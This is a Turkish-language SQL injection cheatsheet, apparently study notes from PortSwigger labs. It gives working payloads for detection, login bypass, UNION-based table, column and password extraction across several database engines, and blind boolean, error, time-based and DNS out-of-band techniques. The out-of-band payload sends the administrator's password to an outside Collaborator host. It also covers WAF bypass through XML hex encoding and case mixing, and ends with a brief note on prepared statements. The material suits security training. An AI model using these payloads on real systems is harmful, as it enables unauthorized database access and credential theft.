# SQL Injection Cheatsheet

Kullanıcı girdisi doğrudan SQL sorgusuna eklenince sorgunun mantığını değiştirme.

## Tespit — İlk Denemeler

```
' 
" 
' OR 1=1--
' OR '1'='1
1' AND '1'='1
```
Hata veya davranış değişikliği varsa → SQLi var.

## Temel Bypass

```sql
-- WHERE filtresini atla (tüm kayıtları döndür)
' OR 1=1--

-- Login bypass (şifre kontrolünü iptal et)
username: administrator'--
password: herhangi bir şey
```

## UNION Attack — Adım Adım

```sql
-- 1) Sütun sayısını bul
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← hata verirse → 2 sütun
-- Kural: hata veren sayının BİR EKSİĞİ = sütun sayısı

-- 2) NULL ile doğrula
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- 3) String kabul eden sütunu bul
' UNION SELECT 'test',NULL--
' UNION SELECT NULL,'test'--

-- 4) Veri çek
' UNION SELECT username,password FROM users--
```

## DBMS'e Göre Farklar

| | MySQL | MSSQL | Oracle | PostgreSQL | SQLite |
|---|---|---|---|---|---|
| Versiyon | `@@version` | `@@version` | `SELECT banner FROM v$version` | `version()` | `sqlite_version()` |
| Yorum | `-- -` veya `#` | `--` | `--` | `--` | `--` |
| String concat | `CONCAT()` | `+` | `\|\|` | `\|\|` | `\|\|` |
| Dual tablosu | gereksiz | gereksiz | `FROM dual` **şart** | gereksiz | gereksiz |
| SUBSTR | `SUBSTRING` | `SUBSTRING` | `SUBSTR` | `SUBSTRING` | `SUBSTR` |
| Tablo keşfi | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` | `sqlite_master` |

## Oracle Özel

```sql
-- Oracle'da UNION SELECT her zaman FROM ister (FROM olmadan hata verir!)
' UNION SELECT NULL,NULL FROM dual--
' UNION SELECT banner,NULL FROM v$version--

-- Oracle'da tablo keşfi (information_schema YOK)
' UNION SELECT table_name,NULL FROM all_tables--

-- Oracle'da sütun keşfi
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

## MySQL Özel

```sql
-- MySQL'de -- sonrası BOŞLUK şart
' UNION SELECT @@version,NULL-- -
-- ya da # kullan
' UNION SELECT @@version,NULL#
```

## Tablo ve Sütun Keşfi — Tam Zincir

Hedef: tablo adını bilmiyorsun, sütun adlarını bilmiyorsun → hepsini adım adım keşfet.

### Non-Oracle (MySQL / MSSQL / PostgreSQL)

```sql
-- ADIM 1: Sütun sayısını bul
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← hata → 2 sütun

-- ADIM 2: Doğrula
' UNION SELECT NULL,NULL--

-- ADIM 3: Tablo isimlerini çek
' UNION SELECT table_name,NULL FROM information_schema.tables--
-- → listede "users" veya "users_xxxx" gibi bir tablo ara

-- ADIM 4: O tablonun sütun isimlerini çek
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_xxxx'--
-- → username_xxx, password_xxx gibi sütunlar çıkacak

-- ADIM 5: Veriyi çek
' UNION SELECT username_xxx,password_xxx FROM users_xxxx--
-- → administrator'ın şifresini al, giriş yap
```

### Oracle

```sql
-- ADIM 1: Sütun sayısını bul
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← hata → 2 sütun

-- ADIM 2: Doğrula (Oracle'da FROM dual ŞART)
' UNION SELECT NULL,NULL FROM dual--

-- ADIM 3: Tablo isimlerini çek (information_schema YOK → all_tables)
' UNION SELECT table_name,NULL FROM all_tables--
-- → listede "USERS" veya "USERS_XXXX" gibi bir tablo ara

-- ADIM 4: O tablonun sütun isimlerini çek (all_tab_columns)
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XXXX'--
-- → USERNAME_XXX, PASSWORD_XXX gibi sütunlar çıkacak
-- ⚠️ Oracle'da tablo adı BÜYÜK HARF olmalı

-- ADIM 5: Veriyi çek
' UNION SELECT USERNAME_XXX,PASSWORD_XXX FROM USERS_XXXX--
-- → administrator'ın şifresini al, giriş yap
```

### Oracle vs Non-Oracle Karşılaştırma

| Adım | Non-Oracle | Oracle |
|---|---|---|
| NULL doğrulama | `UNION SELECT NULL,NULL--` | `UNION SELECT NULL,NULL FROM dual--` |
| Tablo keşfi | `information_schema.tables` | `all_tables` |
| Sütun keşfi | `information_schema.columns` | `all_tab_columns` |
| Tablo adı | küçük harf: `'users'` | BÜYÜK HARF: `'USERS'` |

## Çözdüğüm PortSwigger Labları

1. WHERE bypass: `category=Gifts' OR 1=1--`
2. Login bypass: `username → administrator'--`
3. Oracle UNION versiyon: `' UNION SELECT banner,NULL FROM v$version--`
4. MySQL/MSSQL versiyon: `Gifts' UNION SELECT @@version,NULL-- -`
5. Non-Oracle DB contents listing: `information_schema.tables` → tablo bul → `information_schema.columns` → sütun bul → veri çek
6. Oracle DB contents listing: `all_tables` → tablo bul → `all_tab_columns` → sütun bul → veri çek
7. UNION column count: `ORDER BY` ile sütun sayısını bul → `UNION SELECT NULL,NULL,NULL--` ile doğrula
8. String column detection: `' UNION SELECT 'test',NULL--` → hangi sütun string kabul ediyor
9. Data retrieval from users: `' UNION SELECT username,password FROM users--`
10. Multiple values in single column: `' UNION SELECT NULL,username||'~'||password FROM users--`
11. Blind SQLi conditional responses: TrackingId cookie + `SUBSTRING(...),1,1)='a` + "Welcome back" farkı → Python script ile otomatize
12. Blind SQLi conditional errors: `CASE WHEN (SUBSTR(...)) THEN TO_CHAR(1/0) ELSE '' END FROM dual` → 500 vs 200 sinyal
13. Visible error-based SQLi: `CAST((SELECT password FROM users LIMIT 1) AS int)` → hata mesajında veri sızıyor, brute force gereksiz
14. Blind SQLi time delays: `pg_sleep(10)` → response süresinden sinyal (PostgreSQL)
15. Blind SQLi time delays + info retrieval: `%3B` stacked query + `CASE WHEN ... THEN pg_sleep(5)` ile karakter karakter
16. Out-of-band interaction (teori): XXE + EXTRACTVALUE ile DNS lookup tetikleme — Burp Pro gerekli
17. Out-of-band data exfiltration (teori): şifreyi subdomain olarak DNS'e ekleme — Burp Pro gerekli
18. Filter bypass via XML encoding: WAF keyword engelliyor → `&#xHH;` ile XML hex encode → WAF bypass

## Blind SQLi — 5 Teknik

Sorgu sonucu ekranda görünmüyor. Farklı sinyallerle evet/hayır sorusu sorarak veri çıkarıyorsun.

### 1. Boolean-Based (Sayfa farkı)

Sayfadaki bir fark (örn. "Welcome back" yazısı) üzerinden doğru/yanlış.

```sql
-- Doğru/yanlış farkını tespit et
TrackingId=xyz' AND '1'='1    → "Welcome back" VAR (doğru)
TrackingId=xyz' AND '1'='2    → "Welcome back" YOK (yanlış)

-- Şifrenin ilk harfini bul
xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a

-- Pozisyonu değiştirerek devam → Python script veya Burp Intruder ile otomatize et
```

### 2. Error-Based / Conditional Errors (500 vs 200)

Sayfa içeriği değişmiyor ama SQL hatası tetiklersen 500, tetiklemezsen 200 döner.

```sql
-- Oracle: CASE WHEN ile koşullu hata tetikleme
xyz'||(SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

-- Sinyal: 500 Internal Server Error = doğru karakter, 200 = yanlış
-- TO_CHAR(1/0) → sıfıra bölme hatası → 500
```

### 3. Visible Error-Based (Hata mesajında veri sızıntısı)

Hata mesajı detaylı gösteriliyorsa → CAST ile veriyi hata mesajına sızdır. Brute force gerekmez!

```sql
-- CAST ile tek istekte veri sızdırma
xyz' AND CAST((SELECT password FROM users LIMIT 1) AS int)=1--
-- Hata: "invalid input syntax for type integer: "s3cr3tp4ssw0rd""
-- ⚠️ TrackingId'yi kısalt ki sorgu hata mesajına sığsın
```

### 4. Time-Based (Response süresi)

Sayfa farkı yok, hata farkı yok. Tek sinyal: response süresi.

```sql
-- PostgreSQL: stacked query + pg_sleep
xyz'%3BSELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END--
-- ⚠️ Cookie'de ; ayırıcı → %3B kullan + raw Cookie header ile gönder
-- Sinyal: 5+ saniye = doğru, anında = yanlış

-- Oracle: DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)
-- MSSQL: WAITFOR DELAY '0:0:5'
-- MySQL: SLEEP(5)
```

### 5. Out-of-Band / DNS Exfiltration (Teori)

Sunucu cevap veremiyorsa (async, hata yok, zaman farkı yok) → DNS ile dışarıya veri sızdır.

```sql
-- Oracle: XXE + EXTRACTVALUE ile DNS lookup
'||(SELECT EXTRACTVALUE(xmltype('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR/">%xxe;]>'),'/l') FROM dual)||'
-- DNS'te: s3cr3tp4ssw0rd.xxx.burpcollaborator.net
-- ⚠️ Burp Professional gerekli (Collaborator)
```

## SQLite Özel

```sql
-- SQLite'da tablo keşfi (information_schema YOK → sqlite_master)
' uNiOn SeLeCt tbl_name FROM sqlite_master WHERE '1'='1

-- Tablo yapısını göster (CREATE TABLE ifadesi döner)
' uNiOn SeLeCt sql FROM sqlite_master WHERE tbl_name='admintable' AND '1'='1

-- Veri çek
' uNiOn SeLeCt username FROM admintable WHERE '1'='1
```

## Filtre Bypass Teknikleri

```sql
-- Yorum karakteri (-- veya /*) engellendiğinde → tırnağı doğal kapat
' OR '1'='1

-- Keyword (UNION, SELECT) engellendiğinde → case bypass
' uNiOn SeLeCt ...

-- WAF varken → XML hex encoding (&#xHH; formatı)
-- XML endpoint'lerde (stock check vb.) keyword'leri encode et
<storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; &#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64; &#x46;&#x52;&#x4f;&#x4d; &#x75;&#x73;&#x65;&#x72;&#x73;&#x2d;&#x2d;</storeId>
-- WAF "UNION SELECT" görmez ama DB decode edip çalıştırır

-- Diğer yöntemler: double writing (UNUNIONION), URL encoding (%55NION)
```

## Geliştirici Savunması

```js
// YANLIŞ
query = "SELECT * FROM users WHERE id=" + userId

// DOĞRU — Prepared Statement
query = "SELECT * FROM users WHERE id=?"
stmt.execute(userId)
```

Ek: bcrypt + salt → hash sızsa bile kırılmasın (defense in depth).
